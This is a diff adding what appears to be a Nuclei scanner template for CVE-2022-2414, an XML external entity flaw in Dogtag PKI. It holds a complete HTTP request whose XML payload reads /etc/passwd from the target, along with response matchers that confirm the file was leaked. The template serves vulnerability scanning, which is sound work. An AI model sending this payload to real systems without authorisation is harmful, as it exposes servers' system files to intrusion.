@@ -1,0 +1,37 @@
+id: dogtagpki-xxe-cve-2022-2414
+info:
+  name: Dogtagpki XML External Entity Injection Vulnerability (CVE-2022-2414)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2022-2414,xxe
+
+http:
+  - raw:
+      - |
+        POST /ca/rest/certrequests HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <!--?xml version="1.0" ?-->
+        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+        <CertEnrollmentRequest>
+        <Attributes/>
+        <ProfileID>&ent;</ProfileID>
+        </CertEnrollmentRequest>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        words:
+          - "root:"
+        part: body
+      - type: word
+        words:
+          - "PKIException"
+        part: body
+      - type: word
+        words:
+          - "application/xml"
+        part: header
